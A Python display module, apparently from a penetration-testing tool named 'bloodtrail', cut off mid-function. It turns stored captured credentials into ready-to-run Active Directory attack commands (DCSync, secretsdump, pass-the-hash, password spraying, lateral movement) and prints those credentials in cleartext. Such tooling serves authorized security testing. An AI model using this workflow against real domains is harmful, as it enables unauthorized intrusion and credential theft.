"""
Blood-trail DRY Command Display

Tabular display functions for attack command suggestions.
Shows template ONCE, then lists targets in compact table format.
"""

from typing import List, Dict, Optional
from .command_suggester import CommandTable, TargetEntry, AttackSequence
from .command_mappings import ACCESS_TYPE_PHASES


def deduplicate_command_tables(tables: List[CommandTable]) -> List[CommandTable]:
    """
    Merge command tables with the same command_id, deduplicating targets.

    Multiple queries can produce the same command (e.g., "impacket-psexec")
    with overlapping targets. This function merges them into a single table.

    Args:
        tables: List of CommandTable objects (may have duplicates)

    Returns:
        List of deduplicated CommandTable objects with merged targets
    """
    if not tables:
        return []

    # Group tables by command_id (the true unique identifier)
    merged: Dict[str, CommandTable] = {}

    for table in tables:
        key = table.command_id

        if key not in merged:
            # First occurrence - make a copy to avoid mutating original
            merged[key] = CommandTable(
                command_id=table.command_id,
                name=table.name,
                template=table.template,
                access_type=table.access_type,
                targets=list(table.targets),  # Copy targets list
                variables_needed=list(table.variables_needed),
                context=table.context,
                domain_level=table.domain_level,
                example=table.example,
                objective=table.objective,
                rewards=table.rewards,
                post_success=list(table.post_success),
                permissions_required=table.permissions_required,
                is_discovery=table.is_discovery,
                is_coercion=table.is_coercion,
            )
        else:
            # Merge targets into existing table
            existing = merged[key]
            seen_targets = {(t.user, t.target) for t in existing.targets}

            for target in table.targets:
                target_key = (target.user, target.target)
                if target_key not in seen_targets:
                    existing.targets.append(target)
                    seen_targets.add(target_key)

            # Keep the access_type that's most specific (non-empty wins)
            if table.access_type and not existing.access_type:
                existing.access_type = table.access_type

    return list(merged.values())


class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'


# =============================================================================
# SHARED HELPERS - Used by multiple spray/display functions
# =============================================================================

def extract_creds_from_pwned_users(pwned_users: List) -> tuple:
    """
    Extract passwords and usernames from PwnedUser objects.

    Args:
        pwned_users: List of PwnedUser objects with credentials

    Returns:
        Tuple of (passwords: List[str], usernames: List[str])
    """
    passwords = []
    usernames = []
    for user in pwned_users or []:
        usernames.append(user.username)
        for ctype, cval in zip(user.cred_types, user.cred_values):
            if ctype == "password" and cval:
                passwords.append(cval)
    return passwords, usernames


def fill_spray_template(
    cmd: str,
    dc_ip: str,
    domain: str,
    password: str = "<PASSWORD>",
    usernames: List[str] = None,
) -> str:
    """
    Fill placeholders in a spray command template.

    Args:
        cmd: Command template with placeholders
        dc_ip: Domain Controller IP
        domain: Domain name
        password: Password to fill
        usernames: List of usernames (first one used for <USERNAME>)

    Returns:
        Command with placeholders replaced
    """
    result = cmd
    result = result.replace("<DC_IP>", dc_ip)
    result = result.replace("<DOMAIN>", domain.lower() if domain else "<DOMAIN>")
    result = result.replace("<PASSWORD>", password)
    result = result.replace("<USER_FILE>", "users.txt")
    result = result.replace("<PASSWORD_FILE>", "passwords.txt")
    if usernames:
        result = result.replace("<USERNAME>", usernames[0])
    return result


def print_command_tables(
    tables: List[CommandTable],
    use_colors: bool = True,
    max_targets: int = 20
) -> None:
    """
    Print DRY tabular output for command tables.

    Each command shows:
    - Name + access type badge
    - Template (shown ONCE)
    - Variables needed (if any)
    - Table of targets with ready-to-run commands

    Args:
        tables: List of CommandTable objects
        use_colors: Enable ANSI colors
        max_targets: Maximum targets to show per table
    """
    c = Colors if use_colors else _NoColors

    for table in tables:
        if not table.targets:
            continue

        # Access type badge
        badge = f"[{table.access_type}]" if table.access_type else ""

        # Header: Command name + badge
        print(f"\n{c.BOLD}{table.name}{c.RESET} {c.CYAN}{badge}{c.RESET}")

        # Objective (what the command achieves)
        if table.objective:
            print(f"Objective: {table.objective}")

        # Rewards (practical application)
        if table.rewards:
            print(f"Rewards:   {c.YELLOW}{table.rewards}{c.RESET}")

        # Template (shown ONCE)
        print(f"{c.DIM}Template:  {table.template}{c.RESET}")

        # Example (if available and different from template)
        if table.example and table.example != table.template:
            print(f"{c.GREEN}Example:   {table.example}{c.RESET}")

        # Variables needed
        if table.variables_needed:
            print(f"{c.YELLOW}Need: {', '.join(table.variables_needed)}{c.RESET}")

        # Permissions required (new field)
        if table.permissions_required:
            print(f"{c.CYAN}Requires: {table.permissions_required}{c.RESET}")

        # Table header - adjust columns based on command type
        if table.is_discovery:
            # Discovery commands find targets, attacker provides their own creds
            print(f"\n  {'Discovered':<25} {'Domain':<20} {'Info':<40} {'Ready Command'}")
        elif table.is_coercion:
            # Coercion commands: listener is unconstrained host, target is what we coerce
            print(f"\n  {'Listener (Unconstrained)':<25} {'Coerce Target':<20} {'Reason':<40} {'Ready Command'}")
        else:
            print(f"\n  {'User':<25} {'Target':<20} {'Reason':<40} {'Ready Command'}")
        print(f"  {'-'*25} {'-'*20} {'-'*40} {'-'*50}")

        # Target rows
        displayed = 0
        for entry in table.targets[:max_targets]:
            user_short = _truncate(entry.user, 23)
            target_short = _truncate(entry.target, 18)

            # Build reason with warnings prefix
            warning_str = " ".join(entry.warnings) if entry.warnings else ""
            if warning_str:
                reason_display = f"{c.RED}{warning_str}{c.RESET} {entry.reason}"
                reason_short = _truncate(f"{warning_str} {entry.reason}", 38)
            else:
                reason_display = entry.reason
                reason_short = _truncate(entry.reason, 38) if entry.reason else ""

            # Color reason yellow, but warnings are red (handled above)
            if warning_str:
                print(f"  {user_short:<25} {target_short:<20} {c.RED}{_truncate(warning_str, 15):<16}{c.RESET}{c.YELLOW}{_truncate(entry.reason, 22):<24}{c.RESET} {c.GREEN}{entry.ready_command}{c.RESET}")
            else:
                print(f"  {user_short:<25} {target_short:<20} {c.YELLOW}{reason_short:<40}{c.RESET} {c.GREEN}{entry.ready_command}{c.RESET}")
            displayed += 1

        # Show truncation notice
        if len(table.targets) > max_targets:
            remaining = len(table.targets) - max_targets
            print(f"  {c.DIM}... and {remaining} more targets{c.RESET}")

        print()  # Spacing between tables


def print_command_tables_by_phase(
    tables: List[CommandTable],
    use_colors: bool = True
) -> None:
    """
    Print command tables grouped by attack phase, sorted by impact priority.

    Phases (in order):
    - Quick Wins (Kerberoast, AS-REP, etc.)
    - Lateral Movement (AdminTo > DCOM > PSRemote > RDP)
    - Privilege Escalation (DCSync > GenericAll > WriteDacl > ...)

    Within each phase, commands are sorted by ACCESS_TYPE_PRIORITY (highest first).
    Duplicate tables (same name+access_type) are merged before display.
    """
    c = Colors if use_colors else _NoColors

    # Deduplicate tables: merge tables with same name+access_type
    tables = deduplicate_command_tables(tables)

    # Define phase order (most actionable first)
    PHASE_ORDER = ["Quick Wins", "Lateral Movement", "Privilege Escalation", "Other"]

    # Group by phase
    phases: Dict[str, List[CommandTable]] = {phase: [] for phase in PHASE_ORDER}

    for table in tables:
        if not table.targets:
            continue
        phase = table.phase
        if phase not in phases:
            phase = "Other"
        phases[phase].append(table)

    # Print each phase in defined order
    for phase_name in PHASE_ORDER:
        phase_tables = phases[phase_name]
        if not phase_tables:
            continue

        # Sort by priority within phase (highest impact first)
        phase_tables.sort(key=lambda t: t.priority_score, reverse=True)

        # Phase header with counts
        total_targets = sum(len(t.targets) for t in phase_tables)
        print(f"\n{c.BOLD}{c.CYAN}{'='*70}")
        print(f"  {phase_name.upper()} ({len(phase_tables)} techniques, {total_targets} targets)")
        print(f"{'='*70}{c.RESET}")

        print_command_tables(phase_tables, use_colors)


def print_domain_level_table(
    table: CommandTable,
    principals: List[str],
    use_colors: bool = True
) -> None:
    """
    Print domain-level command (DCSync, etc.) with both formats:
    1. Single ready command template
    2. Expandable list of principals with this right

    Args:
        table: CommandTable for domain-level command
        principals: List of principals with this right (not groups)
        use_colors: Enable ANSI colors
    """
    c = Colors if use_colors else _NoColors

    print(f"\n{c.BOLD}{table.name}{c.RESET} {c.CYAN}[{table.access_type}]{c.RESET}")

    # Objective (what the command achieves)
    if table.objective:
        print(f"Objective: {table.objective}")

    # Rewards (practical application)
    if table.rewards:
        print(f"Rewards:   {c.YELLOW}{table.rewards}{c.RESET}")

    print(f"{c.DIM}Template:  {table.template}{c.RESET}")

    # Example (if available and different from template)
    if table.example and table.example != table.template:
        print(f"{c.GREEN}Example:   {table.example}{c.RESET}")

    if table.variables_needed:
        print(f"{c.YELLOW}Need: {', '.join(table.variables_needed)}{c.RESET}")

    print(f"{c.DIM}Access: Domain-level{c.RESET}")

    # Single ready command (example)
    if table.targets:
        print(f"\n  {c.GREEN}Ready: {table.targets[0].ready_command}{c.RESET}")

    # Principals with this right
    if principals:
        print(f"\n  Principals with DCSync rights:")
        print(f"  {c.DIM}{'+'*40}{c.RESET}")
        for p in principals[:10]:
            print(f"  {c.DIM}|{c.RESET} {p}")
        if len(principals) > 10:
            print(f"  {c.DIM}| ... and {len(principals) - 10} more{c.RESET}")
        print(f"  {c.DIM}{'+'*40}{c.RESET}")

    print()


def format_table_markdown(table: CommandTable) -> str:
    """
    Format CommandTable as markdown for report output.

    Returns:
        Markdown string
    """
    lines = []

    badge = f"[{table.access_type}]" if table.access_type else ""
    lines.append(f"### {table.name} {badge}")
    lines.append("")

    if table.objective:
        lines.append(f"**Objective:** {table.objective}")

    if table.rewards:
        lines.append(f"**Rewards:** {table.rewards}")

    lines.append(f"**Template:** `{table.template}`")

    if table.example and table.example != table.template:
        lines.append(f"**Example:** `{table.example}`")

    if table.variables_needed:
        lines.append(f"**Need:** {', '.join(table.variables_needed)}")

    if table.permissions_required:
        lines.append(f"**Requires:** {table.permissions_required}")

    lines.append("")
    # Adjust column headers for discovery commands
    if table.is_discovery:
        lines.append("| Discovered | Domain | Warnings | Info | Ready Command |")
    else:
        lines.append("| User | Target | Warnings | Reason | Ready Command |")
    lines.append("|------|--------|----------|--------|---------------|")

    for entry in table.targets[:20]:
        user_safe = entry.user.replace("|", "\\|")
        target_safe = entry.target.replace("|", "\\|")
        warnings_safe = " ".join(entry.warnings).replace("|", "\\|") if entry.warnings else ""
        reason_safe = (entry.reason or "").replace("|", "\\|")
        cmd_safe = entry.ready_command.replace("|", "\\|")
        lines.append(f"| {user_safe} | {target_safe} | {warnings_safe} | {reason_safe} | `{cmd_safe}` |")

    if len(table.targets) > 20:
        lines.append(f"| ... | ... | ... | ... | *{len(table.targets) - 20} more* |")

    lines.append("")
    return "\n".join(lines)


def format_tables_markdown(tables: List[CommandTable]) -> str:
    """Format all command tables as markdown grouped by phase"""
    lines = ["## Attack Commands", ""]

    # Group by phase
    phases = {"Quick Wins": [], "Lateral Movement": [], "Privilege Escalation": [], "Other": []}
    for table in tables:
        if table.targets:
            phase = table.phase if table.phase in phases else "Other"
            phases[phase].append(table)

    for phase_name, phase_tables in phases.items():
        if not phase_tables:
            continue
        lines.append(f"### {phase_name}")
        lines.append("")
        for table in phase_tables:
            lines.append(format_table_markdown(table))

    return "\n".join(lines)


def get_table_stats(tables: List[CommandTable]) -> Dict:
    """Get statistics about command tables"""
    total_commands = len(tables)
    total_targets = sum(len(t.targets) for t in tables)

    by_phase = {}
    for table in tables:
        phase = table.phase
        if phase not in by_phase:
            by_phase[phase] = {"commands": 0, "targets": 0}
        by_phase[phase]["commands"] += 1
        by_phase[phase]["targets"] += len(table.targets)

    return {
        "total_commands": total_commands,
        "total_targets": total_targets,
        "by_phase": by_phase,
    }


def print_stats(tables: List[CommandTable], use_colors: bool = True) -> None:
    """Print summary statistics"""
    c = Colors if use_colors else _NoColors
    stats = get_table_stats(tables)

    print(f"{c.DIM}Commands: {stats['total_commands']} | Targets: {stats['total_targets']}{c.RESET}")

    for phase, data in stats["by_phase"].items():
        print(f"  {phase}: {data['commands']} commands, {data['targets']} targets")


# =============================================================================
# POST-SUCCESS SUGGESTIONS
# =============================================================================

def print_post_success(
    post_success: List[Dict],
    domain: str = "",
    dc_ip: str = "<DC_IP>",
    use_colors: bool = True
) -> None:
    """
    Print post-success suggestions after command tables.

    Shows "When You Succeed" next steps for discovery commands
    like Kerberoasting, AS-REP roasting, etc.

    Args:
        post_success: List of {"description": str, "command": str|None}
        domain: Domain for placeholder replacement
        dc_ip: DC IP for placeholder replacement
        use_colors: Enable ANSI colors
    """
    if not post_success:
        return

    c = Colors if use_colors else _NoColors

    print(f"\n  {c.DIM}─── When You Succeed ───────────────────────────────{c.RESET}")

    for i, step in enumerate(post_success, 1):
        desc = step.get("description", "")
        cmd = step.get("command")

        print(f"  {c.CYAN}{i}.{c.RESET} {desc}")
        if cmd:
            # Fill domain/DC placeholders
            cmd = cmd.replace("<DOMAIN>", domain.lower() if domain else "<DOMAIN>")
            cmd = cmd.replace("<DC_IP>", dc_ip)
            print(f"     {c.GREEN}{cmd}{c.RESET}")

    print()


# =============================================================================
# PWNED USER DISPLAY FUNCTIONS
# =============================================================================

def print_technique_legend(techniques: List, c) -> None:
    """
    Print comparison table for lateral movement techniques.

    Shows noise level, ports, advantages, and disadvantages for each technique.
    """
    if not techniques:
        return

    # Table dimensions
    w_tech = 10
    w_noise = 6
    w_ports = 7
    w_adv = 28
    w_dis = 24
    total_w = w_tech + w_noise + w_ports + w_adv + w_dis + 6  # +6 for separators

    # Noise level colors
    noise_colors = {"high": c.RED, "medium": c.YELLOW, "low": c.GREEN}

    print()
    print(f"  {c.DIM}┌{'─' * total_w}┐{c.RESET}")
    print(f"  {c.DIM}│{c.RESET} {c.BOLD}Technique Comparison{c.RESET}{' ' * (total_w - 21)}{c.DIM}│{c.RESET}")
    print(f"  {c.DIM}├{'─' * w_tech}┬{'─' * w_noise}┬{'─' * w_ports}┬{'─' * w_adv}┬{'─' * w_dis}┤{c.RESET}")
    print(f"  {c.DIM}│{c.RESET}{'Technique':^{w_tech}}{c.DIM}│{c.RESET}{'Noise':^{w_noise}}{c.DIM}│{c.RESET}{'Ports':^{w_ports}}{c.DIM}│{c.RESET}{'Advantages':^{w_adv}}{c.DIM}│{c.RESET}{'Disadvantages':^{w_dis}}{c.DIM}│{c.RESET}")
    print(f"  {c.DIM}├{'─' * w_tech}┼{'─' * w_noise}┼{'─' * w_ports}┼{'─' * w_adv}┼{'─' * w_dis}┤{c.RESET}")

    for tech in techniques:
        name = tech.name.split()[0].lower()
        noise = tech.noise_level.upper()[:4]
        noise_c = noise_colors.get(tech.noise_level, "")
        ports = ",".join(str(p) for p in tech.ports)

        # Truncate long text
        adv = tech.advantages[:w_adv-2] + ".." if len(tech.advantages) > w_adv else tech.advantages
        dis = tech.disadvantages[:w_dis-2] + ".." if len(tech.disadvantages) > w_dis else tech.disadvantages

        print(f"  {c.DIM}│{c.RESET}{name:^{w_tech}}{c.DIM}│{c.RESET}{noise_c}{noise:^{w_noise}}{c.RESET}{c.DIM}│{c.RESET}{ports:^{w_ports}}{c.DIM}│{c.RESET}{adv:<{w_adv}}{c.DIM}│{c.RESET}{dis:<{w_dis}}{c.DIM}│{c.RESET}")

    print(f"  {c.DIM}└{'─' * w_tech}┴{'─' * w_noise}┴{'─' * w_ports}┴{'─' * w_adv}┴{'─' * w_dis}┘{c.RESET}")


def _generate_technique_legend_console(techniques: List, c) -> str:
    """Generate technique comparison table for console output (string version)."""
    if not techniques:
        return ""

    lines = []
    w_tech, w_noise, w_ports, w_adv, w_dis = 10, 6, 7, 28, 24
    total_w = w_tech + w_noise + w_ports + w_adv + w_dis + 6

    noise_colors = {"high": c.RED, "medium": c.YELLOW, "low": c.GREEN}

    lines.append("")
    lines.append(f"  {c.DIM}┌{'─' * total_w}┐{c.RESET}")
    lines.append(f"  {c.DIM}│{c.RESET} {c.BOLD}Technique Comparison{c.RESET}{' ' * (total_w - 21)}{c.DIM}│{c.RESET}")
    lines.append(f"  {c.DIM}├{'─' * w_tech}┬{'─' * w_noise}┬{'─' * w_ports}┬{'─' * w_adv}┬{'─' * w_dis}┤{c.RESET}")
    lines.append(f"  {c.DIM}│{c.RESET}{'Technique':^{w_tech}}{c.DIM}│{c.RESET}{'Noise':^{w_noise}}{c.DIM}│{c.RESET}{'Ports':^{w_ports}}{c.DIM}│{c.RESET}{'Advantages':^{w_adv}}{c.DIM}│{c.RESET}{'Disadvantages':^{w_dis}}{c.DIM}│{c.RESET}")
    lines.append(f"  {c.DIM}├{'─' * w_tech}┼{'─' * w_noise}┼{'─' * w_ports}┼{'─' * w_adv}┼{'─' * w_dis}┤{c.RESET}")

    for tech in techniques:
        name = tech.name.split()[0].lower()
        noise = tech.noise_level.upper()[:4]
        noise_c = noise_colors.get(tech.noise_level, "")
        ports = ",".join(str(p) for p in tech.ports)
        adv = tech.advantages[:w_adv-2] + ".." if len(tech.advantages) > w_adv else tech.advantages
        dis = tech.disadvantages[:w_dis-2] + ".." if len(tech.disadvantages) > w_dis else tech.disadvantages
        lines.append(f"  {c.DIM}│{c.RESET}{name:^{w_tech}}{c.DIM}│{c.RESET}{noise_c}{noise:^{w_noise}}{c.RESET}{c.DIM}│{c.RESET}{ports:^{w_ports}}{c.DIM}│{c.RESET}{adv:<{w_adv}}{c.DIM}│{c.RESET}{dis:<{w_dis}}{c.DIM}│{c.RESET}")

    lines.append(f"  {c.DIM}└{'─' * w_tech}┴{'─' * w_noise}┴{'─' * w_ports}┴{'─' * w_adv}┴{'─' * w_dis}┘{c.RESET}")
    return "\n".join(lines)


def _generate_technique_legend_markdown(techniques: List) -> str:
    """Generate technique comparison table as markdown."""
    if not techniques:
        return ""

    lines = []
    lines.append("")
    lines.append("**Technique Comparison**")
    lines.append("")
    lines.append("| Technique | Noise | Ports | Advantages | Disadvantages |")
    lines.append("|-----------|-------|-------|------------|---------------|")

    for tech in techniques:
        name = tech.name.split()[0].lower()
        noise = tech.noise_level.upper()
        ports = ",".join(str(p) for p in tech.ports)
        lines.append(f"| {name} | {noise} | {ports} | {tech.advantages} | {tech.disadvantages} |")

    lines.append("")
    return "\n".join(lines)


def print_pwned_followup_commands(
    user_name: str,
    cred_type: str = None,
    cred_value: str = None,
    access: List = None,  # List[MachineAccess]
    domain_level_access: str = None,
    use_colors: bool = True,
    cred_types: List[str] = None,
    cred_values: List[str] = None,
    dc_ip: str = None,
    dc_hostname: str = None,
    domain_sid: str = None,
) -> None:
    """
    Print follow-up commands after marking a user as pwned.

    Commands are auto-filled with stored credential values.
    Shows ALL available techniques per target for easy copy-paste.
    Supports multiple credential types per user.

    Args:
        user_name: User UPN (USER@DOMAIN.COM)
        cred_type: Single credential type (backward compat, use cred_types instead)
        cred_value: Single credential value (backward compat, use cred_values instead)
        access: List of MachineAccess objects
        domain_level_access: 'domain-admin' if user has DA-level rights
        use_colors: Enable ANSI colors
        cred_types: List of credential types (password, ntlm-hash, etc.)
        cred_values: List of corresponding credential values (parallel arrays)
        dc_ip: Domain Controller IP address (stored in bloodtrail config)
        dc_hostname: Domain Controller hostname (stored or auto-detected)
    """
    from .command_mappings import (
        CRED_TYPE_TEMPLATES,
        LATERAL_TECHNIQUES,
        fill_pwned_command,
        infer_dc_hostname,
        get_techniques_for_access,
    )

    c = Colors if use_colors else _NoColors
    access = access or []

    # Handle backward compatibility: single cred_type/cred_value -> arrays
    if cred_types is None:
        cred_types = [cred_type] if cred_type else ["password"]
    if cred_values is None:
        cred_values = [cred_value] if cred_value else [""]

    # Extract username and domain
    if "@" in user_name:
        username, domain = user_name.split("@")
    else:
        username = user_name
        domain = ""

    # Use primary credential for main command generation
    primary_cred_type = cred_types[0] if cred_types else "password"
    primary_cred_value = cred_values[0] if cred_values else ""

    # Determine DC target - use stored config or infer from domain
    dc_target = dc_hostname or dc_ip or infer_dc_hostname(domain)

    # Header
    print()
    print(f"{c.BOLD}{'='*70}{c.RESET}")
    print(f"  {c.CYAN}FOLLOW-UP COMMANDS{c.RESET} ({c.BOLD}{user_name}{c.RESET})")
    print(f"{'='*70}")

    # Show all credentials
    if len(cred_types) > 1:
        creds_display = ", ".join(f"{c.YELLOW}{ct}{c.RESET}" for ct in cred_types)
        print(f"  Credentials: {creds_display}")
    else:
        print(f"  Credential: {c.YELLOW}{primary_cred_type}{c.RESET} (stored - auto-filled)")
    print()

    # ==========================================================================
    # PRIVILEGE ESCALATION PHASE
    # ==========================================================================
    if domain_level_access == "domain-admin":
        print(f"{c.BOLD}{c.CYAN}{'='*70}")
        print(f"  PRIVILEGE ESCALATION")
        print(f"{'='*70}{c.RESET}")
        print()
        print(f"👑 {c.RED}{c.BOLD}DOMAIN ADMIN ACCESS{c.RESET} [DCSync] (Priority: 199)")
        print()
        print(f"  {'Attack':<22} {'Reason':<40} {'Ready Command'}")
        print(f"  {'-'*22} {'-'*40} {'-'*60}")
        template = CRED_TYPE_TEMPLATES.get(primary_cred_type, {}).get("DCSync")
        if template:
            cmd = fill_pwned_command(
                template,
                username=username,
                domain=domain,
                target=dc_target,
                cred_value=primary_cred_value,
                dc_ip=dc_ip
            )
            print(
                f"  {c.BOLD}{'DCSync':<22}{c.RESET} "
                f"{c.YELLOW}{'Member of Domain Admins':<40}{c.RESET} "
                f"{c.GREEN}{cmd}{c.RESET}"
            )
        print()

    # Group access by privilege level
    admin_access = [a for a in access if a.privilege_level == "local-admin"]
    user_access = [a for a in access if a.privilege_level == "user-level"]
    dcom_access = [a for a in access if a.privilege_level == "dcom-exec"]

    # Credential type display names
    CRED_TYPE_LABELS = {
        "password": "password",
        "ntlm-hash": "ntlm-hash (Pass-the-Hash)",
        "kerberos-ticket": "kerberos-ticket (Pass-the-Ticket)",
        "certificate": "certificate",
    }

    # ==========================================================================
    # LATERAL MOVEMENT PHASE (sorted by priority: AdminTo=99 > DCOM=90 > PSRemote=85 > RDP=65)
    # ==========================================================================
    has_lateral_access = admin_access or dcom_access or user_access
    if has_lateral_access:
        total_lateral = len(admin_access) + len(dcom_access) + len(user_access)
        print(f"\n{c.BOLD}{c.CYAN}{'='*70}")
        print(f"  LATERAL MOVEMENT ({total_lateral} targets)")
        print(f"{'='*70}{c.RESET}")

    # Local Admin access - per-target technique list (Priority: 99)
    if admin_access:
        print()
        print(f"🩸 {c.RED}{c.BOLD}LOCAL ADMIN ACCESS{c.RESET} ({len(admin_access)} machines) [AdminTo] (Priority: 99)")

        priority_targets = []
        techniques = get_techniques_for_access("AdminTo")

        # Generate commands for each credential type
        for cred_idx, (ct, cv) in enumerate(zip(cred_types, cred_values)):
            print()
            label = CRED_TYPE_LABELS.get(ct, ct)
            print(f"  {c.CYAN}Using: {label}{c.RESET}")
            print()

            for ma in admin_access[:10]:  # Limit to first 10
                print(f"  {c.BOLD}{ma.computer}{c.RESET}")

                # Show all available techniques for this target
                for tech in techniques:
                    template = tech.command_templates.get(ct)
                    if template:
                        cmd = fill_pwned_command(
                            template,
                            username=username,
                            domain=domain,
                            target=ma.computer,
                            cred_value=cv,
                            target_ip=ma.computer_ip or ""
                        )
                        # Short name for technique
                        tech_short = tech.name.split()[0].lower()
                        print(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")

                # Track priority targets with sessions (only on first cred type)
                if cred_idx == 0 and ma.sessions:
                    priority_targets.append((ma, ma.sessions))

                print()  # Space between targets

            if len(admin_access) > 10:
                print(f"  {c.DIM}... and {len(admin_access) - 10} more machines{c.RESET}")

        # Priority targets with sessions (secretsdump) - show for primary credential
        if priority_targets:
            print()
            print(f"  {c.YELLOW}⚠ PRIORITY TARGETS (privileged sessions detected){c.RESET}")
            print()

            for ma, sessions in priority_targets[:5]:
                sessions_str = ", ".join(sessions[:2])
                print(f"  {c.BOLD}{ma.computer}{c.RESET}")
                print(f"    {c.YELLOW}Sessions: {sessions_str}{c.RESET}")

                # Show secretsdump for each credential type
                for ct, cv in zip(cred_types, cred_values):
                    sd_template = CRED_TYPE_TEMPLATES.get(ct, {}).get("secretsdump")
                    if sd_template:
                        sd_cmd = fill_pwned_command(
                            sd_template,
                            username=username,
                            domain=domain,
                            target=ma.computer,
                            cred_value=cv,
                            target_ip=ma.computer_ip or ""
                        )
                        label_short = "PtH" if ct == "ntlm-hash" else ct[:4]
                        print(f"    {c.DIM}secretsdump ({label_short}):{c.RESET}  {c.GREEN}{sd_cmd}{c.RESET}")
                print()

        # Show technique comparison legend
        print_technique_legend(techniques, c)

    # DCOM access - per-target technique list (Priority: 90)
    if dcom_access:
        print(f"\n⚙️  {c.BLUE}{c.BOLD}DCOM ACCESS{c.RESET} ({len(dcom_access)} machines) [ExecuteDCOM] (Priority: 90)")

        techniques = get_techniques_for_access("ExecuteDCOM")

        # Generate commands for each credential type
        for ct, cv in zip(cred_types, cred_values):
            print()
            label = CRED_TYPE_LABELS.get(ct, ct)
            print(f"  {c.CYAN}Using: {label}{c.RESET}")
            print()

            for ma in dcom_access[:5]:
                print(f"  {c.BOLD}{ma.computer}{c.RESET}")

                for tech in techniques:
                    template = tech.command_templates.get(ct)
                    if template:
                        cmd = fill_pwned_command(
                            template,
                            username=username,
                            domain=domain,
                            target=ma.computer,
                            cred_value=cv,
                            target_ip=ma.computer_ip or ""
                        )
                        tech_short = tech.name.split()[0].lower()
                        print(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")

                print()

    # User-level access (RDP, PSRemote) - per-target technique list (Priority: 65-85)
    if user_access:
        print(f"\n🔵 {c.BLUE}{c.BOLD}USER-LEVEL ACCESS{c.RESET} ({len(user_access)} machines) [CanPSRemote/CanRDP] (Priority: 65-85)")

        # Generate commands for each credential type
        for ct, cv in zip(cred_types, cred_values):
            print()
            label = CRED_TYPE_LABELS.get(ct, ct)
            print(f"  {c.CYAN}Using: {label}{c.RESET}")
            print()

            for ma in user_access[:10]:
                print(f"  {c.BOLD}{ma.computer}{c.RESET}")

                # Show techniques based on access types
                for access_type in ma.access_types:
                    if access_type in ("CanRDP", "CanPSRemote"):
                        techniques = get_techniques_for_access(access_type)
                        for tech in techniques:
                            template = tech.command_templates.get(ct)
                            if template:
                                cmd = fill_pwned_command(
                                    template,
                                    username=username,
                                    domain=domain,
                                    target=ma.computer,
                                    cred_value=cv,
                                    target_ip=ma.computer_ip or ""
                                )
                                tech_short = tech.name.split()[0].lower()
                                print(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")

                print()  # Space between targets

            if len(user_access) > 10:
                print(f"  {c.DIM}... and {len(user_access) - 10} more machines{c.RESET}")

    # No edge-based access found
    if not admin_access and not user_access and not dcom_access and not domain_level_access:
        print(f"  {c.DIM}No direct machine access via AdminTo/CanRDP/CanPSRemote edges.{c.RESET}")
        print()

    print(f"{'='*70}")

    # Auto-show post-exploitation commands if user has local-admin or domain-admin access
    has_local_admin = any(a.privilege_level == "local-admin" for a in access)
    if has_local_admin or domain_level_access:
        print_post_exploit_commands(
            user_name=user_name,
            access=access,
            domain_level_access=domain_level_access,
            cred_types=cred_types,
            cred_values=cred_values,
            dc_ip=dc_ip,
            domain_sid=domain_sid,
            use_colors=use_colors,
        )

    # Show authenticated user attacks ONCE at the bottom (template form)
    # These are generic - same for any domain user
    print_authenticated_attacks_template(use_colors=use_colors, dc_ip=dc_ip)


def print_pwned_users_table(
    users: List,  # List[PwnedUser]
    use_colors: bool = True
) -> None:
    """
    Print a table of all pwned users with their access summary.

    Args:
        users: List of PwnedUser objects
        use_colors: Enable ANSI colors
    """
    c = Colors if use_colors else _NoColors

    if not users:
        print(f"{c.DIM}No pwned users tracked.{c.RESET}")
        print(f"{c.DIM}Mark a user as pwned: bloodtrail --pwn USER@DOMAIN.COM --cred-type password --cred-value 'secret'{c.RESET}")
        return

    # Header
    print()
    print(f"{c.BOLD}{'='*90}{c.RESET}")
    print(f"  {c.CYAN}PWNED USERS{c.RESET} ({len(users)} total)")
    print(f"{'='*90}")
    print()

    # Table header
    print(f"  {'User':<30} {'Cred Type':<15} {'Admin On':<10} {'User On':<10} {'Domain?':<8} {'Pwned At'}")
    print(f"  {'-'*30} {'-'*15} {'-'*10} {'-'*10} {'-'*8} {'-'*20}")

    for user in users:
        # Count access by type (cred-access and rbcd-capable count as admin-equivalent)
        admin_count = sum(1 for a in user.access if a.privilege_level in ("local-admin", "cred-access", "rbcd-capable"))
        user_count = sum(1 for a in user.access if a.privilege_level in ("user-level", "dcom-exec"))
        domain_marker = "YES" if user.domain_level_access == "domain-admin" else "-"

        # Format timestamp
        pwned_at_str = user.pwned_at.strftime("%Y-%m-%d %H:%M")

        # Color based on privilege level
        if user.domain_level_access == "domain-admin":
            name_color = c.RED
        elif admin_count > 0:
            name_color = c.YELLOW
        else:
            name_color = c.RESET

        # Show credential types (comma-separated if multiple)
        cred_display = ",".join(user.cred_types) if user.cred_types else "password"
        if len(cred_display) > 15:
            cred_display = cred_display[:12] + "..."

        print(f"  {name_color}{user.name:<30}{c.RESET} {cred_display:<15} {admin_count:<10} {user_count:<10} {domain_marker:<8} {pwned_at_str}")

    # Credentials section - show actual pwned credentials
    print()
    print(f"{c.BOLD}{'='*90}{c.RESET}")
    print(f"  {c.GREEN}CAPTURED CREDENTIALS{c.RESET}")
    print(f"{'='*90}")
    print()

    for user in users:
        if not user.cred_types or not user.cred_values:
            continue

        # Color based on privilege level (include cred-access and rbcd-capable as admin-equiv)
        if user.domain_level_access == "domain-admin":
            name_color = c.RED
        elif any(a.privilege_level in ("local-admin", "cred-access", "rbcd-capable") for a in user.access):
            name_color = c.YELLOW
        else:
            name_color = c.RESET

        print(f"  {name_color}{c.BOLD}{user.name}{c.RESET}")

        # Print each credential type and value
        for cred_type, cred_value in zip(user.cred_types, user.cred_values):
            # Format credential type for display
            cred_label = cred_type.replace("-", " ").title()
            print(f"    {c.DIM}{cred_label}:{c.RESET} {c.GREEN}{cred_value}{c.RESET}")

        print()

    # gMSA Access section - show service accounts user can read passwords for
    users_with_gmsa = [u for u in users if u.gmsa_access]
    if users_with_gmsa:
        print(f"{c.BOLD}{'='*90}{c.RESET}")
